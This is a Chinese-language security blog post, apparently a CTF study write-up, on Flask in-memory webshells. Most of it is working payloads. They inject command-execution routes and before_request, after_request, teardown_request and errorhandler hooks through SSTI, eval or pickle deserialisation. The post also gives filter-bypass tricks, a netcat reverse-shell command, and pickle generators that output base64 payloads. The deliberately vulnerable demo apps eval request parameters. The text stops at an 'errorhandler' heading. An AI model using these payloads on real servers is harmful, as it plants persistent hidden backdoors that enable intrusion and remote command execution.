<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<h6 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h6><p>对于<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>这一截，<code>url_for</code>是<code>Flask</code>的一个内置函数，通过<code>Flask</code>内置函数可以调用其<code>__global__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入得<code>modules</code>，可以看到这里是支持<code>__builtins__</code>的。</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518143651820.png" alt="image-20240518143651820"></p>
<p><strong>在<code>__builtins__</code>模块中，<code>Python</code>在启动时就直接为我们导入了很多内建函数</strong>，准确的说，<code>python</code>在启动时会首先加载内建名称空间，内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象。现在再来跟进一下<code>__builtins__</code>模块：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518144123444.png" alt="image-20240518144123444"></p>
<p>可以看到，在<code>__builtins__</code>模块中存在eval、exec等命令执行函数的。</p>
<p>此时在ssti中就可以尝试直接进行rce，如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518204521230.png" alt="image-20240518204521230"></p>
<h6 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h6><p>现在继续看<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda  :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,  &#39;whoami&#39;)).read())</code>这一截payload，分析一下代码：</p>
<ol>
<li><ul>
<li><p>这行代码使用 Flask 的 <code>add_url_rule</code> 方法来添加一个路由规则。</p>
</li>
<li><p>第一个参数 <code>&#39;/shell&#39;</code> 是 URL 规则的路径。</p>
</li>
<li><p>第二个参数 <code>&#39;shell&#39;</code> 是视图函数的名称。</p>
</li>
<li><p>第三个参数是一个 lambda 表达式，它定义了视图函数的行为。</p>
<ul>
<li><p>lambda 表达式没有参数，因此 <code>lambda:</code> 后面没有任何参数列表。</p>
</li>
<li><p>lambda 表达式的主体部分 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br></pre></td></tr></table></figure>

<p> 是一个表达式，它执行了如下操作：</p>
<ul>
<li>从请求上下文堆栈 <code>_request_ctx_stack.top</code> 中获取请求对象 <code>request</code>。</li>
<li>使用 <code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code> 获取名为 <code>&#39;cmd&#39;</code> 的请求参数，如果没有指定 <code>&#39;cmd&#39;</code> 参数，则默认为 <code>&#39;whoami&#39;</code>。</li>
<li>将获取到的命令传递给 <code>os.popen()</code> 函数执行，并读取其输出。</li>
</ul>
</li>
</ul>
</li>
<li><p>因此，这行代码添加了一个能够执行命令的路由规则。</p>
</li>
</ul>
</li>
<li><p>lambda 表达式：</p>
<ul>
<li>lambda 表达式是一种匿名函数，它可以在不使用 <code>def</code> 关键字的情况下创建函数。</li>
<li>lambda 表达式的一般形式是 <code>lambda 参数列表: 表达式</code>。</li>
<li>lambda 表达式的主要优点是可以在一行内定义简单的函数。</li>
</ul>
</li>
</ol>
<p>这段代码的意图是添加一个路由规则，使得通过访问 <code>/shell</code> 路径并传递命令参数可以执行命令，并返回其输出结果。Lambda 表达式被用于定义这个简单的视图函数。</p>
<p>而在<code>Flask</code>中注册路由的时候是由<code>@app.route()</code>装饰器来实现的，跟进源码看看</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518205342399.png" alt="image-20240518205342399"></p>
<p>确实就是调用的<code>add_url_rule()</code>函数来添加路由。</p>
<h6 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h6><p>**先说明一下为什么在第二部分与第三部分之间要用<code>,</code>**：</p>
<p>在这个代码片段中，逗号 <code>,</code> 的作用是将两个参数传递给 <code>eval</code> 函数。在 Python 中，<code>eval</code> 函数可以接受两个参数：第一个参数是要执行的代码字符串，第二个参数是一个字典，用于指定 <code>eval</code> 函数执行代码时的全局和局部命名空间。</p>
<p>其中第三部分就属于<code>eval函数</code>的第二个参数，其中包含了两个键值对：</p>
<ol>
<li><code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;]</code>：将 <code>_request_ctx_stack</code> 对象作为全局命名空间的一部分传递给 <code>eval</code> 函数。</li>
</ol>
<p>​    2.<code>&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</code>：将 <code>current_app</code> 对象作为全局命名空间的一部分传递给 <code>eval</code> 函数。</p>
<p>这样做的目的是为了让 <code>eval</code> 函数在执行代码时能够访问到 <code>app</code> 和 <code>_request_ctx_stack</code> 对象，因为这些对象在原始代码中被引用到了。</p>
<p><strong>现在来看最后一部分：</strong><code>&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code></p>
<p><code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量，是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>. <code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</p>
<p>到此, 大致逻辑基本就梳理清晰了, <code>eval</code>函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到.</p>
<h5 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h5><ul>
<li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li>
<li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>.</li>
<li>字符串可采用拼接方式, 如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>.</li>
<li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换.</li>
<li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li>
<li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>, 可以使用<code>&#123;%`或者`%&#125;</code>绕过, <code>&#123;%%&#125;</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li>
<li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]</code>绕过.</li>
<li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li>
<li>其它的手法参考<code>SSTI</code>绕过过滤的方法即可…</li>
</ul>
<p>还有的关于绕过的变形payload可以在参考文章里面看</p>
<p>参考文章：</p>
<p><code>https://xz.aliyun.com/t/10933?time__1311=mq%2BxB70QD%3D9xlxGgrDyiDcDjOAHr6e%2BYx&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-0</code></p>
<h3 id="新版Flask内存马"><a href="#新版Flask内存马" class="headerlink" title="新版Flask内存马"></a>新版<code>Flask</code>内存马</h3><p>正如在上面旧版<code>Flask</code>提出的<code>add_url_rule</code>函数在当前较新的<code>Flask</code>版本已经不再支持在程序运行的过程中通过add_url_rule添加路由了。如下：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518223939172.png" alt="image-20240518223939172"></p>
<p>所以，我们只能通过其他方式添加路由来处理我们的请求。</p>
<p><strong>测试了一下，下面的几种方法无论环境中是否有debug模式都能打。</strong></p>
<h4 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h4><p>在<code>Flask</code>中，<code>before_request</code>是一个装饰器，<strong>它用于在请求处理之前执行特定的函数</strong>。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p>
<p>跟一下<code>@app.before_request()</code>装饰器源码：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519125940205.png" alt="image-20240519125940205"></p>
<p>可以在这里看到这个<code>before_request</code>装饰器实际上调用的是<code>self.before_request_funcs.setdefault(None, []).append(f)</code>,解释一下：</p>
<ul>
<li><code>before_request_funcs</code>：是 Flask 应用实例的一个属性，用于存储在每次请求之前执行的函数。</li>
<li><code>setdefault(None, [])</code>：这是一个字典方法，用于设置字典中指定键的默认值。在这里，如果字典中不存在键为 <code>None</code> 的值，就将 <code>None</code> 的默认值设置为一个空列表 <code>[]</code>。</li>
<li><code>.append(f)</code>：无论<code>None</code>键是否存在，都会将传入的函数 <code>f</code> 添加到对应键的列表中，即添加到 <code>before_request_funcs</code> 字典中 <code>None</code> 键对应的列表中。</li>
</ul>
<p>这个函数<code>f</code>就是我们要添加的函数。</p>
<p>写一个源码程序来测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    a = <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用如下payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/e?cmd=app.before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())</span><br></pre></td></tr></table></figure>

<p><strong>这样后续所有的访问结果都将变为命令执行的结果</strong></p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518225750706.png" alt="image-20240518225750706"></p>
<p>同样可以改改，结合旧版内存马对payload的分析，比如这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=app.before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;name&#x27;)).read())</span><br></pre></td></tr></table></figure>

<p>这样就可以同时执行多条命令</p>
<p>同样可以从测试源码中看到想要直接使用可以<code>eval(str($string))</code>这样包裹或者直接<code>eval()</code>包裹也行，测试一下(将返回值改了)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    a = <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>不加<code>str()</code>：</strong><br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519134059111.png" alt="image-20240519134059111"></p>
<p><strong>加<code>str()</code>：</strong><br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519134305823.png" alt="image-20240519134305823"></p>
<p>都成功了，但是在测试过程中发现最好还是加上<code>str()</code>函数，虽然都可以执行成功，本地测试过程有点细微差别。</p>
<p>由此可见通过<code>before_request</code>添加内存马这一条路是可行的，但同样会有一点问题，就是使用lambda必然会得到一个返回值，那么服务后续的操作都无法进行，会影响到主机的正常业务。</p>
<h4 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h4><p>还可以尝试<code>@app.after_request</code>来解决，与<code>@app.before_request</code>类似，**<code>after_request</code>会在请求结束得到响应包之后进行操作**，跟进一下源码看看：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519135826767.png" alt="image-20240519135826767"></p>
<p>底层源码和<code>before_request</code>好像。</p>
<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接受一个reponse对象，同时返回一个reponse对象。</p>
<p>但是我们仅通过lambda无法对原始传进来的reponse进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response。</p>
<p>访问对应的url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>

<p>函数的内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda resp: #传入参数</span><br><span class="line">    CmdResp if request.args.get(&#x27;cmd&#x27;) and      #如果请求参数含有cmd则返回命令执行结果</span><br><span class="line">    exec(&#x27;</span><br><span class="line">        global CmdResp;     #定义一个全局变量，方便获取</span><br><span class="line">        CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span><br><span class="line">    &#x27;)==None    #恒真</span><br><span class="line">    else resp)  #如果请求参数没有cmd则正常返回</span><br><span class="line">#这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</span><br></pre></td></tr></table></figure>

<p>所以利用也是差不多的，本地测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><strong>有str()函数</strong>：</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519152944681.png" alt="image-20240519152944681"></p>
<p>注意：不知道为啥我本地测试在原先传入的<code>e</code>路由传入命令不行，需要另外传路由，如上就有正常页面</p>
<p>本地测试显示：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519153125867.png" alt="image-20240519153125867"></p>
<p>但是在一道ctf题（H&amp;NCTF2024 ezFlask）可以直接在原路由进行传入<code>cmd</code>进行rce，但是那道题的<code>flask版本</code>挺低的，<code>add_url_rule()</code>可用并且是post传入cmd来更改路由再get传入的。这里注意一下。</p>
<p><strong>无<code>str()</code>函数：</strong><br>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp)</span><br></pre></td></tr></table></figure>

<p>如下成功执行：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519160145954.png" alt="image-20240519160145954"></p>
<p>但是同样有上面那个问题并且在那道题目中可以复现。</p>
<h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><p>在 Flask 中，每次接收到一个请求并处理完毕后，都会调用 <code>teardown_request()</code> 函数。这个函数可以被开发人员用来释放请求过程中分配的资源或执行其他清理操作。只需要在代码中定义一个函数并使用<code>@app.teardown_request</code> 装饰器即可。Flask 框架会在每个请求处理结束后自动调用这个函数。</p>
<p>看一看这个装饰器的源码：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519183513601.png" alt="image-20240519183513601"></p>
<p>和上面那两个方法的源码都挺像的，但是<strong>这个命令执行后无回显</strong>。</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;ls&gt;1.txt&#x27;))</span><br><span class="line">或者</span><br><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls&gt;5.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>传入的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls &gt; 10.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>成功执行生成了一个10.txt文件：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519195626724.png" alt="image-20240519195626724"></p>
<p>并且测试了一下的确没有回显，尝试一下反弹shell，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;nc ip port -e /bin/bash&#x27;))</span><br></pre></td></tr></table></figure>

<p>也成功连上。</p>
<p>测试一下<code>after_request</code>的payload(改一下基本函数即可)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.teardown_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(\&#x27;ls&gt;11.txt\&#x27;).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>

<p>也成功执行：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519195925114.png" alt="image-20240519195925114"></p>
<p>暂时就这两种payload。</p>
<h4 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h4><p>gxngxngxn师傅找到的，<a href="https://www.cnblogs.com/gxngxngxn/p/18181936">文章</a>，只能说牛逼</p>
<p>简单给点代码试试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">errorhandler</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;error_handler(404)&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;404 Error&#x27;</span></span><br></pre></td></tr></table></figure>

<p>在这个代码中，使用了装饰器<code>@errorhandler(404)</code>注册了一个钩子函数<code>errorhandler()</code>函数，当发生HTTP 404 错误（页面不存在）时，调用钩子函数，跟进装饰器源码看看：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173140213.png" alt="image-20240519173140213"></p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173149931.png" alt="image-20240519173149931"></p>
<p>再跟进一下<code>register_error_handler()</code>函数</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519173241705.png" alt="image-20240519173241705"></p>
<p>总结前面两个的源码，猜测<code>f</code>就是返回值，文章说这里的code是404，exc_class是一个对象（个人还不是很懂这两个参数，等后面理解更深了再来理解）。payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;)</span><br></pre></td></tr></table></figure>

<p>在传入后再访问一个不存在的页面进行传参，这里再使用前面的源码试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>成功执行：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519175544050.png" alt="image-20240519175544050"></p>
<p>那么为什么在这个自测试的源码中没有定义错误执行函数也能成功呢，</p>
<p>这是因为即使你没有显式地定义 <code>@errorhandler(404)</code> 装饰器，Flask 内部依然会有一个默认的 404 错误处理器。当你访问一个不存在的 URL（比如 <code>/123</code>），Flask 会触发这个默认的 404 错误处理器。</p>
<p>这个同样会进入到装饰器源码，所以同样可以利用。</p>
<p>虽然这个方法在那道ctf题（题目debug为false）里面复现不出来，主要还是着重于新版的<code>Flask</code>。</p>
<h4 id="个人学习总结"><a href="#个人学习总结" class="headerlink" title="个人学习总结"></a>个人学习总结</h4><ul>
<li>首先就是上面的所有方式个人本地测试时在debug模式为True或者False都能打</li>
<li>其实感觉python这几个漏洞都息息相关，python内存马的使用挺广的，个人感觉ssti、pickle反序，普通的python相关的命令执行都能用，注意融汇贯通,也许过滤可以参考ssti的过滤。</li>
<li>对于<code>str()</code>函数，只是将参数转换为字符串类型，虽然不是必要，但是最好还是加上利用。</li>
</ul>
<p><strong>简单说明一下：</strong></p>
<p>比如在每个payload中的<code>app.after_request_funcs</code>前面的<code>app</code>，</p>
<ul>
<li><p><strong>对于ssti、pickle反序和一般的命令执行的题</strong>，在flask框架里面一般都有这一串代码:</p>
<p><code>app = Flask(__name__)</code>，这一般就已经可以让这个环境有app这个应用示例。如果没有，我们可以通过类似于ssti的链子来调用出app，如下：</p>
<p><code>__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs</code>,后续需要的连上来就行。</p>
</li>
</ul>
<p><strong>在ssti和pickle的运用：</strong></p>
<ul>
<li><p>对于ssti就像旧版内存马样先用链子跳到<code>eval()</code>函数那里在填充进去payload即可利用</p>
</li>
<li><p>对于pickle，直接给出类似的pickle:</p>
</li>
</ul>
<p>before_request:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>after_request:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>errorhandler:</p>
